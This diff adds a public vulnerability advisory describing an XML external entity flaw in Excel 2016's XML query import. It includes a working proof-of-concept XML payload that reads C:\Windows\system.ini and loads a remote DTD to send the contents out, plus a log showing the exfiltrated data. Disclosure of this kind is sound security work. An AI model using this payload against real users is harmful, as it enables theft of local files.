@@ -1,0 +1,107 @@
+# Exploit Title: Microsoft Excel 2016 1901 - XML External Entity Injection
+# Discovery by: hyp3rlinx
+# Date: 2019-12-02
+# Vendor Homepage: www.microsoft.com
+# Tested Version: 2016 v1901
+# CVE: N/A
+
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MICROSOFT-EXCEL-2016-v1901-IMPORT-ERROR-EXTERNAL-ENTITY-INJECTION.txt
+[+] ISR: ApparitionSec          
+ 
+
+[Vendor]
+www.microsoft.com
+
+
+[Product]
+Excel 2016 v1901
+
+Microsoft Excel is a spreadsheet developed by Microsoft for Windows, macOS, Android and iOS.
+It features calculation, graphing tools, pivot tables, and a macro programming language called Visual Basic for Applications. 
+
+
+[CVE]
+N/A
+
+
+[Vulnerability Type]
+Error Import Based XML External Entity Injection
+
+
+[Security Issue]
+Excel query from file feature is vulnerable to "Error" based XML External Entity attacks, if the user chooses the "Import as
+Html page" functionality upon receiving errors importing a specially crafted XML file.
+
+This can result in potential remote data exfiltration, user interaction is required to exploit this vulnerability.
+
+Tested successfuly Windows 10 .NET framework version v4.0.30319.
+
+C:\>dir /b %windir%\Microsoft.NET\Framework\v*
+v4.0.30319
+
+
+[Exploit/POC]
+Create a new ".xlsx" file then, go to Data tab and choose 'New Query/From File/From XML'
+
+1) You will get error like: 
+
+"Error:
+
+Unable to connect
+
+We encountered an error while trying to connect.
+
+The user will then get an option to 'Edit' where they can import the file as an HTML file
+
+Result Local data can be exfiltrated to remote server"
+
+2) Excel will then give you option to 'Edit' and import as 'Html Page' from the drop down menu in Excel
+
+User has choose to import as HTML then XXE attack will succeed:
+
+e.g.
+
+127.0.0.1 - - [05/Mar/2019 15:31:16] "GET /?;%20for%2016-bit%20app%20support[386Enh]woafont=dosapp.fonEGA80WOA.FON=EGA80WOA.FO
+/1.1" 200 -
+
+
+Malicious XML file to load as New Data Query
+
+"test.xml"
+
+<?xml version='1.0'?>
+<!DOCTYPE root [ 
+<!ENTITY % file SYSTEM 'C:\Windows\system.ini'>
+<!ENTITY % dtd SYSTEM 'http://127.0.0.1:8000/payload.dtd'>
+%dtd;]>
+<pwn>&send;</pwn>
+
+
+
+[Network Access]
+Local
+
+
+[Severity]
+Medium
+
+
+[Disclosure Timeline]
+Vendor Notification: May 10, 2019
+MSRC: May 17, 2019 "case did not meet the bar for servicing as a Security Release.
+Engineering Team may or may not fix in a future version of the release."
+November 30, 2019 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
